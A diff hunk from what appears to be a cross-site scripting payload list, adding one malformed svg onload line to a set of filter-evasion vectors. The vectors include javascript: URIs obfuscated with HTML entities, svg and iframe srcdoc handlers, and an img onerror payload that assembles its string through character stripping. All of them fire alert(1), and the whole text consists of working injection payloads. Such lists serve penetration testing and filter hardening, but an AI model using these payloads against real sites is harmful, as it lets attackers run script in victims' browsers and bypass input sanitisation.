@@ -3,6 +3,7 @@
 '\&fjlig;avascript:alert(1)'
 '\&fjlig;javascript:alert(1)'
 &nvlt;svg onload=alert(1)>
+<svg onload="alert(1)" <="" svg=""
 <iframe src-doc="<svg onload=alert(1)&nvgt;"></iframe>
 <svg onload=alert(1)&nvgt;
 <img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
